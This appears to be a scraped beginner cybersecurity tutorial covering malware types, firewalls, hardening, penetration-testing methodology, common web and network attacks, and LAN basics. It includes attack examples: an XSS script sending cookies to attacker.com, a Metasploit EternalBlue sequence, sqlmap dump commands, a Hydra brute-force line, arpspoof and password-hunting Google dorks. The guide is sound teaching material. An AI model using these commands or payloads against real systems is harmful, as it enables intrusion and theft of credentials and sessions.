Type What It Does Example Virus Attaches to files, spreads when executed ILOVEYOU (2000) Worm Self-replicates across networks without user action WannaCry (2017) Trojan Disguised as legitimate software Fake Adobe update with RAT Ransomware Encrypts files, demands payment LockBit, REvil Spyware Secretly monitors and exfiltrates data Keyloggers Rootkit Hides itself deep in the OS Hides attacker processes Botnet Turns infected machines into zombie army Mirai botnet RAT Remote Access Trojan — full attacker control njRAT, AsyncRAT

docs.title: Static vs Dynamic Analysis
docs.text:
Static Analysis (No Execution)Dynamic Analysis (Execution in Sandbox)Common Malware Indicators 
# Examine the file WITHOUT running it
# Safe — malware never executes

# Get file hash (check against VirusTotal)
sha256sum suspicious.exe
md5sum suspicious.exe

# Check file type (malware often lies about type)
file suspicious.exe

# Look for readable strings inside binary
strings suspicious.exe | grep -E "(http|cmd|powershell|reg)"

# Check PE headers (Windows executable info)
# Tools: PEStudio, PE-bear, CFF Explorer

# Look for packed/obfuscated code
# High entropy section = likely packed/encrypted

docs.title: Firewall
docs.text:
A firewall is a network security device that monitors and controls incoming and outgoing network traffic based on predefined rules.

Types of FirewallsBasic iptables Rules 
Packet Filter (Layer 3/4)
→ Examines source/destination IP and port
→ Fast but no deep inspection
→ Example: iptables

Stateful Inspection
→ Tracks the STATE of connections
→ Knows if a packet belongs to an established connection
→ More intelligent than packet filters

Application Firewall (Layer 7 / WAF)
→ Understands application protocols (HTTP, FTP, DNS)
→ Can block SQLi, XSS, malicious payloads
→ Example: ModSecurity, Cloudflare WAF

Next-Generation Firewall (NGFW)
→ Combines stateful + application inspection
→ Integrated IDS/IPS, threat intelligence
→ Example: Palo Alto, Fortinet, Cisco Firepower

# Block all incoming traffic by default
iptables -P INPUT DROP

# Allow established connections
iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT

# Allow SSH only from trusted IP
iptables -A INPUT -s 192.168.1.10 -p tcp --dport 22 -j ACCEPT

# Allow HTTP and HTTPS
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Block a specific malicious IP
iptables -A INPUT -s 185.220.101.1 -j DROP

# Save rules
iptables-save > /etc/iptables/rules.v4

docs.text:

# Snort Rule Syntax:
# action protocol src_ip src_port -> dst_ip dst_port (options)

# Detect Nmap SYN scan

(msg:"Nmap SYN Scan Detected"; flags:S; \

sid:1000001;)

(msg:"SQL Injection Attempt"; \
content:"' OR '1'='1"; nocase; \
sid:1000002;)

docs.title: EDR — Endpoint Detection & Response
docs.text:
EDR solutions monitor individual endpoints (laptops, servers, workstations) in real-time to detect and respond to threats that traditional antivirus misses.

Traditional AV vs EDR:

Traditional Antivirus:
→ Matches files against known signature database
→ Misses: fileless malware, zero-days, LOLBins

EDR:
→ Monitors ALL behaviour on the endpoint
→ Process creation, file access, network connections, registry changes
→ Can detect: fileless malware, lateral movement, credential theft
→ Can RESPOND: isolate host, kill process, roll back changes

Popular EDR Solutions:

- SentinelOne          → AI-powered EDR

docs.title: Zero Trust Architecture
docs.text:
Zero Trust is a security model based on the principle: "Never trust, always verify."

Traditional vs Zero Trust

  • Old model: Trust everything inside the network perimeter (like a castle moat — safe inside, dangerous outside)
  • Zero Trust: Verify every user, every device, every request — regardless of where it comes from
graph LR
    A[User Request] --> B{Identity Verified?}
    B -- No --> C[Access Denied]
    B -- Yes --> D{Device Healthy?}
    D -- No --> C
    D -- Yes --> E{Least Privilege Applied?}
    E --> F[Access Granted\nContinuously Monitored]
    F --> G{Anomaly Detected?}
    G -- Yes --> C
Zero Trust Principle What It Means Verify Explicitly Always authenticate and authorize with all data points Least Privilege Give users only the access they need, nothing more Assume Breach Design as if attackers are already inside Microsegmentation Divide the network into small isolated zones MFA Everywhere Single passwords are never enough

docs.title: 🔐 System Hardening
docs.text:
Hardening is the process of reducing the attack surface of a system by removing unnecessary features, applying security configurations, and keeping software up to date.

Think of it this way

Every open port, every installed service, and every default password is a door an attacker could walk through. Hardening means closing every door you don't need and locking the ones you do.

Linux HardeningWindows HardeningWeb Application Hardening 
# 1. Keep everything updated
apt update && apt upgrade -y

# 2. Disable unnecessary services
systemctl disable bluetooth
systemctl disable cups        # Printing service
systemctl disable avahi-daemon

# 3. Configure SSH securely (/etc/ssh/sshd_config)
PermitRootLogin no            # Never allow root SSH
PasswordAuthentication no     # Keys only, no passwords
MaxAuthTries 3                # Limit login attempts
AllowUsers alice bob          # Whitelist specific users

# 4. Set up automatic updates
apt install unattended-upgrades
dpkg-reconfigure unattended-upgrades

# 5. Configure firewall (UFW — simple frontend for iptables)
ufw default deny incoming
ufw default allow outgoing
ufw allow ssh
ufw enable

# 6. Audit listening services
ss -tulnp                     # Show all open ports
netstat -tulnp

# 7. Check for SUID binaries (privilege escalation risk)
find / -perm -4000 -type f 2>/dev/null

docs.title: 📦 Backup & Disaster Recovery
docs.text: Backups are one of the most important defensive controls — especially against ransomware.

docs.title: The 3-2-1 Backup Rule
docs.text:
┌─────────────────────────────────────────────────┐
│              The 3-2-1 Rule                     │
│                                                 │
│  3  copies of your data                        │
│  2  on different storage media                 │
│  1  stored off-site (or offline)               │
│                                                 │
│  Example:                                       │
│  ✅ Copy 1: On your production server           │
│  ✅ Copy 2: On a local NAS / backup drive       │
│  ✅ Copy 3: Cloud storage or tape (off-site)    │
│                                                 │
│  ⚠️ Ransomware will encrypt all connected       │
│     drives. The offline/off-site copy is        │
│     your lifeline!                             │

Test Your Backups!

An untested backup is not a backup. Regularly perform restore drills to ensure your backups actually work before you need them in a crisis.

docs.title: 👥 Security Awareness Training
docs.text:
The most sophisticated firewall in the world can't stop an employee from clicking a phishing link. People are both the biggest vulnerability and the best defense.

Key Training Topics for All Staff

  • How to identify phishing emails
  • Safe password practices (use a password manager!)
  • How to report suspicious activity
  • Physical security (tailgating, shoulder surfing)
  • Safe use of public Wi-Fi
  • Social engineering awareness
Phishing SimulationPassword Best Practices 
Phishing simulations test employees with fake phishing emails

Process:
1. Security team sends realistic phishing email to all staff
2. Track who clicks, who enters credentials, who reports it
3. Employees who fall for it → targeted training
4. Repeat quarterly to measure improvement

Platforms:
- GoPhish (free, open source)
- KnowBe4 (enterprise)
- Proofpoint Security Awareness Training

❌ Don't:
→ Reuse passwords across sites
→ Use personal info (name, birthday, pet)
→ Use common patterns (P@ssw0rd!)
→ Share passwords

✅ Do:
→ Use a password manager (Bitwarden, 1Password)
→ Use unique passwords for every account
→ Enable MFA everywhere possible
→ Use long passphrases: "correct-horse-battery-staple"
→ Change passwords immediately if breach suspected

docs.title: 📖 Introduction
docs.text:
Offensive Security is the practice of proactively attacking systems, networks, and applications — with permission — to find weaknesses before real attackers do.

Think of it this way

A locksmith who breaks into your house (with your permission) to show you your lock is weak is doing offensive security. They find the problem so you can fix it before a real burglar shows up. 🔐

Defensive vs Offensive Security

  • Defensive Security = Building walls, firewalls, monitoring (the guards 🏰)
  • Offensive Security = Attacking your own defenses to test them (the testers 🗡️) Both sides work together — you cannot defend what you haven't tried to break.

Legal & Ethical Notice

Everything in this guide is for educational purposes only. Hacking systems without explicit written permission is illegal in most countries and can result in prison time. Always hack ethically and legally.

graph TD
    A[Offensive Security] --> B[Penetration Testing]

docs.title: 🎭 Types of Hackers
docs.text:
Not all hackers are criminals. The term "hacker" simply means someone who deeply understands a system and finds creative ways to use or break it.

Hat Color Who They Are Legal? Intent 🟢 White Hat Ethical hackers, pentesters, security researchers ✅ Yes Find and fix vulnerabilities ⚫ Black Hat Cybercriminals, malware authors ❌ No Steal, damage, or exploit 🌫️ Grey Hat Hack without permission but report findings ⚠️ Murky Curiosity, sometimes reward 🔵 Blue Hat External consultants hired before a product launch ✅ Yes Pre-release vulnerability testing 🔴 Red Hat Vigilante hackers who attack black hats ❌ Illegal "Robin Hood" of hacking

Real-World Example

Companies like Google, Facebook, and Microsoft run Bug Bounty programs where they pay white hat hackers to find vulnerabilities. Google has paid millions of dollars to researchers who responsibly disclosed bugs.

docs.title: 🧠 The Attacker's Mindset
docs.text:
The most important skill in offensive security isn't knowing tools — it's thinking like an attacker.

The Core Question

Always ask: "How can this be misused?" Every feature, every input field, every API endpoint is a potential attack surface.

docs.title: 🗺️ Penetration Testing Methodology
docs.text:
Penetration testing follows a structured process. Skipping steps leads to missed vulnerabilities.

graph LR
    A[1. Planning & Scoping] --> B[2. Reconnaissance]
    B --> C[3. Scanning & Enumeration]
    C --> D[4. Exploitation]
    D --> E[5. Post-Exploitation]
    E --> F[6. Reporting]
    F --> G[7. Remediation & Re-test]

docs.title: 1️⃣ Planning & Scoping
docs.text:
Before touching anything, you define the rules of engagement.

What Gets Defined

  • What systems are in scope (allowed to test)?
  • What systems are out of scope (hands off)?
  • What types of attacks are allowed?
  • What's the timeline?
  • Who is the point of contact if something breaks?
📄 Legal Document: Rules of Engagement (ROE)
┌─────────────────────────────────────────┐
│  Target: 192.168.1.0/24                 │
│  Allowed: Network scan, web app testing │
│  Not Allowed: DoS attacks, physical     │
│  Start: 01 Jan 2025  End: 07 Jan 2025   │
│  Emergency Contact: security@corp.com   │
└─────────────────────────────────────────┘

Never Skip This Step

Without written authorization, everything you do is illegal — even if you meant well. Always get written permission first.

docs.title: 2️⃣ Reconnaissance (Information Gathering)
docs.text:
Collect as much information about the target as possible without touching their systems.

Passive Recon (No direct contact)Active Recon (Direct contact)OSINT Tools 
Goal: Learn about the target from public sources only

Sources:
- Google searches (Google Dorking)
- WHOIS records (who owns a domain)
- LinkedIn / social media (employee names, roles)
- Shodan.io (internet-connected devices)
- DNS records
- Job postings (reveal tech stack)
- GitHub repos (leaked credentials or code)

Goal: Probe the target's infrastructure directly

Techniques:
- Ping sweeps (is the host alive?)
- DNS enumeration (find subdomains)
- Port scanning (what services are running?)
- Banner grabbing (what software version?)

⚠️ This may appear in the target's logs!

theHarvester  → Email, domain, host discovery
Maltego       → Visual link analysis of relationships
Shodan        → Search engine for internet devices
recon-ng      → Web-based OSINT framework
SpiderFoot    → Automated OSINT collection
Google Dorks  → Advanced Google search operators

Real-World Example: Google Dorking

site:target.com filetype:pdf        → Find PDF files
site:target.com inurl:admin         → Find admin pages
site:target.com "index of /"        → Find open directories
"password" filetype:txt site:target.com → Find exposed passwords

docs.title: 3️⃣ Scanning & Enumeration
docs.text:
Now you actively probe the target to map out the attack surface.

Port Scanning (Nmap)Web Application ScanningUnderstanding Nmap Output 
# Basic scan — find open ports
nmap 192.168.1.1

# Scan all 65535 ports
nmap -p- 192.168.1.1

# Detect OS and service versions
nmap -sV -O 192.168.1.1

# Run default vulnerability scripts
nmap -sC -sV 192.168.1.1

# Stealth scan (less detectable)
nmap -sS 192.168.1.1

# Nikto — web vulnerability scanner
nikto -h http://target.com

# Gobuster — directory & file brute-forcing
gobuster dir -u http://target.com -w wordlist.txt

# WhatWeb — identify technologies used
whatweb http://target.com

PORT     STATE  SERVICE  VERSION
22/tcp   open   ssh      OpenSSH 7.4
80/tcp   open   http     Apache 2.4.6
443/tcp  open   https    Apache 2.4.6
3306/tcp closed mysql

↑ Port   ↑ State  ↑ Service  ↑ Version (attack surface!)

Why Versions Matter

If a target is running Apache 2.4.6, you can search for known vulnerabilities in that exact version on sites like CVE Mitre or Exploit-DB. Old software = more known vulnerabilities.

docs.title: 4️⃣ Exploitation
docs.text:
This is where you attempt to take advantage of a discovered vulnerability to gain access.

Important

Exploitation is only done after confirming you have permission for the specific target and vulnerability type in your scope.

Manual ExploitationMetasploit FrameworkCommon Vulnerability Types 
Finding a SQL injection manually:

Normal URL:  https://site.com/user?id=1
Attack URL:  https://site.com/user?id=1' OR '1'='1

If the page behaves differently → SQL injection exists!
An attacker can then:
- Dump the entire database
- Bypass login pages
- Read server files

# Start Metasploit
msfconsole

# Search for an exploit
search eternalblue

# Use an exploit module
use exploit/windows/smb/ms17_010_eternalblue

# Set the target IP
set RHOSTS 192.168.1.100

# Set your listener IP
set LHOST 192.168.1.50

# Run the exploit
run

Buffer Overflow   → Overflow memory to execute malicious code
SQL Injection     → Insert SQL commands into database queries
Command Injection → Execute OS commands through a web app
XSS               → Inject JavaScript into a web page
File Upload       → Upload malicious scripts to a server
Broken Auth       → Bypass or brute-force authentication

docs.title: 5️⃣ Post-Exploitation
docs.text:
After gaining access, a real attacker (and a pentester) explores what they can do from the inside.

graph TD
    A[Initial Access Gained] --> B[Privilege Escalation]
    B --> C[Lateral Movement]
    C --> D[Persistence]
    D --> E[Data Exfiltration]

Pentester vs Real Attacker

A pentester stops at proof — they demonstrate they could exfiltrate data (e.g., screenshot of a sensitive file) without actually stealing it. A real attacker would take everything.

docs.title: 💉 SQL Injection (SQLi)
docs.text:
The attacker inserts malicious SQL code into an input field to manipulate the database.

Real-Life Analogy

Imagine a form asking for your name. You write '; DROP TABLE users; -- instead. If the server doesn't sanitize this, it may delete the entire users table from the database. 😱

Basic SQL InjectionSQLMap (Automated)Prevention 
-- Normal login query:
SELECT * FROM users WHERE username='alice' AND password='secret';

-- Attacker enters username: admin'--
-- The query becomes:
SELECT * FROM users WHERE username='admin'--' AND password='anything';
--                                               ↑ This part is commented out!
-- Result: Logged in as admin without a password!

# Test a URL for SQL injection
sqlmap -u "http://target.com/page?id=1"

# Dump the entire database
sqlmap -u "http://target.com/page?id=1" --dbs

# Dump a specific table
sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump

# ❌ Vulnerable code
query = "SELECT * FROM users WHERE name='" + user_input + "'"

# ✅ Safe code — Parameterized Query
query = "SELECT * FROM users WHERE name = ?"
cursor.execute(query, (user_input,))

# The database treats user_input as DATA, not SQL code

docs.title: 🔗 Cross-Site Scripting (XSS)
docs.text:
The attacker injects JavaScript into a web page that runs in other users' browsers.

Real-Life Analogy

Imagine a comment section where you post: <script>alert('hacked')</script>. If the website doesn't sanitize it, every visitor who sees your comment will get a popup — or worse, have their session cookies stolen.

Types of XSSCookie Stealing ExamplePrevention 
Reflected XSS   → Payload in the URL, affects only that request
                  Example: http://site.com/search?q=<script>...</script>

Stored XSS      → Payload saved in database, affects all users
                  Example: Malicious comment on a blog

DOM-based XSS   → JavaScript in the page itself reads attacker input
                  No server involved

// Attacker injects this script:
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie)
</script>

// Victim's browser sends their session cookie to the attacker
// Attacker can now log in as the victim!

<!-- ❌ Vulnerable — directly inserting user input into HTML -->
<p>Hello, {{ username }}</p>

<!-- ✅ Safe — HTML encoding special characters -->
<p>Hello, {{ username | escape }}</p>

<!-- & becomes &   < becomes <   > becomes > -->
<!-- This treats user input as TEXT, not HTML -->

docs.title: 🔓 Broken Authentication
docs.text:
Flaws in login systems that let attackers bypass authentication or hijack accounts.

Common IssuesBrute Force AttackPrevention 
Weak Passwords       → "password123" or "admin/admin"
No Account Lockout   → Brute-force 1000 passwords without being blocked
Predictable Tokens   → Session IDs that are sequential (1001, 1002...)
Exposed Credentials  → Passwords in URLs or logs
No MFA               → Single point of failure

# Hydra — brute force login page
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
      http-post-form "//login:username=^USER^&password=^PASS^:Invalid"

# This tries thousands of passwords automatically

✅ Use Multi-Factor Authentication (MFA)
✅ Lock accounts after 5 failed attempts
✅ Use strong, hashed passwords (bcrypt/argon2)
✅ Expire session tokens after logout
✅ Use HTTPS everywhere

docs.title: 🕵️ Man-in-the-Middle (MITM)
docs.text:
The attacker secretly intercepts communication between two parties who think they're talking directly to each other.

Without Attack:
[You] ←——————————→ [Bank Website]

With MITM Attack:
[You] ←——→ [Attacker] ←——→ [Bank Website]
              ↑
        Reads everything!
        (passwords, card numbers)
ARP SpoofingPrevention 
# Attacker poisons ARP cache to intercept traffic
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Now all traffic from .100 goes through the attacker first

✅ Always use HTTPS (look for the padlock 🔒)
✅ Use a VPN on public Wi-Fi
✅ Enable HSTS on websites
✅ Use certificate pinning in apps
✅ Avoid open Wi-Fi networks

docs.title: 💥 Denial of Service (DoS / DDoS)
docs.text:
Overwhelming a service with traffic or requests until it crashes or becomes unavailable.

Real-Life Analogy

Imagine a store with one cashier. If 10,000 people walk in at the same time asking questions but never buying anything, the real customers can't get service. The store is effectively shut down.

Types of DoSAmplification Attack 
Volume-based   → Flood with traffic (UDP floods, ICMP floods)
Protocol-based → Exploit protocol weaknesses (SYN floods)
Application    → Exhaust server resources (HTTP floods, Slowloris)
Distributed    → Attack from thousands of infected computers (botnet)

1. Attacker sends small request (100 bytes)
   → to misconfigured DNS server
   → spoofing victim's IP as source

2. DNS server sends LARGE response (3000 bytes)
   → directly to victim

3. Amplification = 30x attack traffic
   with minimal effort!

docs.title: 👤 Social Engineering
docs.text:
The art of manipulating people to give up confidential information or perform actions. Often the easiest way in — no technical skill required.

Famous Quote

"The weakest link in any security system is the human." — Kevin Mitnick, one of the world's most famous hackers.

PhishingPretextingBaiting & Tailgating 
Type: Mass email impersonating a trusted entity

Example:
From: security@paypa1.com  ← Notice the '1' instead of 'l'
Subject: "Your account has been suspended"
Body: "Click here to verify: http://paypa1-verify.com"

Goal: Steal credentials or install malware

Variants:
- Spear Phishing  → Targeted at specific individual
- Whaling         → Targeted at executives (CEO, CFO)
- Smishing        → Phishing via SMS
- Vishing         → Phishing via phone call

The attacker creates a fake scenario (pretext) to extract info

Example:
Attacker calls IT Help Desk:
"Hi, this is David from the finance team.
 I'm in a meeting with the CEO and I'm locked out.
 Can you reset my password quickly?"

Defense: Verify identity with out-of-band authentication
(call back on registered phone number)

Baiting:
→ Drop USB drives in a company parking lot
→ Employee picks it up, plugs it in "to find the owner"
→ Malware installs automatically

Tailgating (Physical):
→ Attacker follows an employee through a secure door
→ "Can you hold that? My hands are full."
→ Now inside the building without a badge scan

Prevention

Security awareness training is the #1 defense against social engineering. Technology cannot stop a human from being manipulated — education can.

docs.title: Intro to LAN
docs.text: A beginner-friendly introduction to Local Area Networks — what they are, how they work, and how devices communicate within them.

docs.title: What is a LAN?
docs.text:
A Local Area Network (LAN) is a network of devices connected together within a limited geographic area — such as a home, office, school, or building.

Every device on a LAN can communicate with every other device on that same network. The key word is local — a LAN doesn't span cities or countries; that's the job of WANs (Wide Area Networks).

docs.title: Everyday Examples
docs.text:
• Your home Wi-Fi network connecting your phone, laptop, and smart TV
  • An office network connecting computers, printers, and servers
  • A school computer lab where all machines share the same internet connection
  • A gaming setup where multiple consoles play together locally

docs.title: Key Characteristics of a LAN
docs.text:
• High speed — typically 100 Mbps to 10 Gbps on wired connections
  • Low latency — devices are physically close to each other
  • Private — not directly accessible from the internet
  • Owned and managed by the individual or organization using it
  • Uses private IP addresses (e.g., 192.168.x.x, 10.x.x.x)

docs.title: How Devices Connect to a LAN
docs.text: Devices join a LAN either through a wired (Ethernet) or wireless (Wi-Fi) connection.

docs.title: Wired Connection (Ethernet)
docs.text:
• Uses an Ethernet cable (Cat5e, Cat6, Cat6a) plugged into a switch or router
  • Faster and more reliable than Wi-Fi
  • Common in desktops, servers, printers, and gaming setups

docs.title: Wireless Connection (Wi-Fi)
docs.text:
• Uses radio waves to connect to a wireless access point (WAP) or router
  • More convenient — no cables needed
  • Slightly more susceptible to interference and security risks

docs.title: The Central Device
docs.text:
All devices on a LAN connect to a central device — typically a switch or a router (for home networks, these are often combined into one box).

Laptop ──────────────┐
Phone (Wi-Fi) ───────┤
Smart TV (Wi-Fi) ────┤──► Router/Switch ──► Internet
Printer ─────────────┤
Desktop ─────────────┘

docs.title: Switch
docs.text:
A switch is the core device of a wired LAN. It connects multiple devices and forwards data only to the intended recipient — not to everyone on the network.

  • Operates at Layer 2 (Data Link layer) of the OSI model
  • Uses MAC addresses to direct traffic
  • Maintains a MAC address table to learn which device is on which port
  • Most home routers have a built-in 4-port switch

docs.title: Router
docs.text:
A router connects your LAN to other networks — most importantly, the internet.

  • Operates at Layer 3 (Network layer)
  • Uses IP addresses to route traffic
  • Assigns IP addresses to devices via DHCP
  • Acts as the default gateway — all traffic leaving the LAN goes through it
  • Performs NAT — translating private IPs to your public internet IP

docs.title: Access Point (AP)
docs.text: A wireless access point extends the LAN wirelessly. In home setups, the router includes a built-in AP. In larger offices, dedicated APs are deployed throughout the building and connected back to the core switch.

docs.title: Network Interface Card (NIC)
docs.text: Every device that connects to a network has a NIC — either built into the motherboard or as an add-on card. The NIC has a unique MAC address burned in at the factory.

docs.title: IP Addressing on a LAN
docs.text: Every device on a LAN is assigned an IP address — a logical address used to identify it on the network.

docs.title: Private IP Ranges
docs.text:
LANs use private IP address ranges that are not routable on the public internet:

Range CIDR Common Use 10.0.0.0 – 10.255.255.255 10.0.0.0/8 Large corporate networks 172.16.0.0 – 172.31.255.255 172.16.0.0/12 Medium networks 192.168.0.0 – 192.168.255.255 192.168.0.0/16 Home and small office

Most home networks use 192.168.0.x or 192.168.1.x.

docs.title: Static vs Dynamic IPs
docs.text:
Dynamic (DHCP) — The router automatically assigns an IP address when a device joins the network. This is the default for most devices (laptops, phones).

Static — Manually configured IP that never changes. Used for devices that need a consistent address — servers, printers, and network devices.

docs.title: Typical Home LAN Address Layout
docs.text:
Network:         192.168.1.0/24
Router/Gateway:  192.168.1.1
DNS Server:      192.168.1.1  (router handles DNS forwarding)
DHCP Range:      192.168.1.100 – 192.168.1.200
Broadcast:       192.168.1.255

Devices:
  Laptop     → 192.168.1.101  (DHCP)
  Phone      → 192.168.1.102  (DHCP)
  Printer    → 192.168.1.10   (Static)
  NAS/Server → 192.168.1.20   (Static)

docs.title: MAC Addresses on a LAN
docs.text:
While IP addresses identify devices logically, MAC addresses identify them physically at the hardware level.

  • Every NIC has a unique 48-bit MAC address (e.g., 00:1A:2B:3C:4D:5E)
  • MAC addresses are used by switches to forward frames within the LAN
  • They don't leave the local network — routers strip and replace MAC addresses at each hop

docs.title: How a Switch Uses MAC Addresses
docs.text:
When a switch receives a frame, it records the source MAC address and the port it arrived on. Over time it builds a complete MAC address table:

Port  |  MAC Address
------|------------------
  1   |  00:1A:2B:3C:4D:5E  (Laptop)
  2   |  AA:BB:CC:DD:EE:FF  (Desktop)
  3   |  11:22:33:44:55:66  (Printer)

When a frame arrives destined for AA:BB:CC:DD:EE:FF, the switch sends it only to Port 2 — not to every device. This is far more efficient than a hub (which broadcasts everything to everyone).

docs.title: How Devices Communicate on a LAN
docs.text: When Device A wants to send data to Device B on the same LAN, a specific process happens:

docs.title: Step 1 — Does A know B's MAC address?
docs.text: A knows B's IP address but needs its MAC address to actually send the frame. It checks its ARP cache first.

docs.title: Step 2 — ARP Request (if MAC unknown)
docs.text:
A broadcasts an ARP (Address Resolution Protocol) request to the entire LAN:

"Who has IP 192.168.1.102? Tell 192.168.1.101"

docs.title: Step 3 — ARP Reply
docs.text:
Device B responds directly to A:

"192.168.1.102 is at AA:BB:CC:DD:EE:FF"

docs.title: Step 4 — Frame is sent
docs.text:
A now sends the Ethernet frame directly to B's MAC address. The switch forwards it to the correct port.

Device A                  Switch                  Device B
192.168.1.101             (forwards)              192.168.1.102
00:1A:...                                         AA:BB:...

  |── ARP broadcast ─────────────────────────────► (all ports)
  |◄── ARP reply ──────────────────────────────── |
  |── Ethernet frame (to AA:BB:...) ─────────────►|

docs.title: VLANs — Virtual LANs
docs.text: A VLAN logically divides a single physical LAN into multiple isolated networks. Devices in different VLANs can't communicate directly — even if they're plugged into the same switch.

docs.title: Why Use VLANs?
docs.text:
• Security — Separate sensitive departments (Finance, HR) from the general network
  • Performance — Reduce unnecessary broadcast traffic
  • Management — Group devices by function, not physical location

docs.title: Example VLAN Setup
docs.text:
Same Physical Switch
├── Ports 1–8   → VLAN 10: Staff Network     (192.168.10.0/24)
├── Ports 9–16  → VLAN 20: Guest Wi-Fi       (192.168.20.0/24)
└── Ports 17–24 → VLAN 30: Security Cameras  (192.168.30.0/24)

Guests can browse the internet but can't reach internal staff devices or cameras.

docs.title: Inter-VLAN Routing
docs.text: To allow traffic between VLANs, you need a Layer 3 device — either a router (router-on-a-stick setup) or a Layer 3 switch.

docs.title: DHCP on a LAN
docs.text: DHCP (Dynamic Host Configuration Protocol) is what automatically gives every device an IP address when it joins the network. On a home LAN, the router is the DHCP server.

docs.title: What DHCP Assigns
docs.text:
• IP address
  • Subnet mask
  • Default gateway
  • DNS server

docs.title: The DORA Process
docs.text:
Device joins LAN:

1. DISCOVER  → "Is there a DHCP server? I need an address"
2. OFFER     ← "Here, take 192.168.1.105 — it's yours for 24 hours"
3. REQUEST   → "I'll take 192.168.1.105 please"
4. ACK       ← "Confirmed. Lease granted."

docs.title: DHCP Lease
docs.text: IP addresses are leased for a set duration. When the lease expires, the device either renews it or gets a new address. This is why your laptop might have a different IP after being away for a while.

docs.title: DNS on a LAN
docs.text:
When you type google.com into a browser on your LAN, your device needs to resolve that name to an IP address. This is handled by DNS.

On most home networks, the router acts as a DNS forwarder — it receives DNS queries from local devices and forwards them to an upstream DNS server (like 8.8.8.8 or 1.1.1.1).

docs.title: Local DNS Resolution
docs.text: Some networks run a local DNS server (like Pi-hole) to: - Block ads and tracking at the DNS level - Resolve internal hostnames (e.g., printer.local → 192.168.1.10) - Cache frequent lookups for faster responses

docs.title: LAN Security
docs.text: LANs are often assumed to be safe because they're "internal" — but this assumption is dangerous. Attackers who gain access to your LAN can cause significant damage.

docs.title: Common LAN Attacks
docs.text:
ARP Spoofing / Poisoning An attacker sends fake ARP replies, associating their MAC address with another device's IP. This lets them intercept traffic — a man-in-the-middle attack. 

Attacker tells Device A: "I'm the router (192.168.1.1)"
Attacker tells Router:   "I'm Device A (192.168.1.101)"
All of A's traffic now flows through the attacker.

Rogue DHCP Server An attacker sets up a fake DHCP server. Devices that connect get a malicious gateway or DNS server — redirecting all their traffic.

MAC Flooding An attacker floods a switch with fake MAC addresses, filling the MAC table. The switch falls back to broadcasting all traffic (like a hub), allowing the attacker to capture it.

VLAN Hopping Exploiting misconfigured trunk ports to send traffic into a VLAN the attacker shouldn't have access to.

Packet Sniffing On older hubs (or after a successful ARP poisoning attack), all traffic on the LAN can be captured and read — including unencrypted passwords and data.

docs.title: LAN Security Best Practices
docs.text: Practice What it prevents Use a managed switch with port security Limits which MACs can use each port Enable Dynamic ARP Inspection (DAI) Blocks ARP spoofing Use DHCP Snooping Prevents rogue DHCP servers Segment with VLANs Limits lateral movement Use WPA3 for Wi-Fi Protects wireless access Disable unused switch ports Reduces physical attack surface Use 802.1X authentication Only authorized devices can join Encrypt sensitive traffic (TLS/HTTPS) Protects data from sniffing Monitor with a SIEM or IDS Detects anomalous LAN behaviour

docs.text: Feature LAN WAN MAN Geographic scope Building / campus Country / global City-wide Speed Very high (1–10 Gbps) Moderate (varies) Moderate–high Latency Very low Higher Low–moderate Ownership Private ISP / leased Mixed Example Home network The internet City Wi-Fi
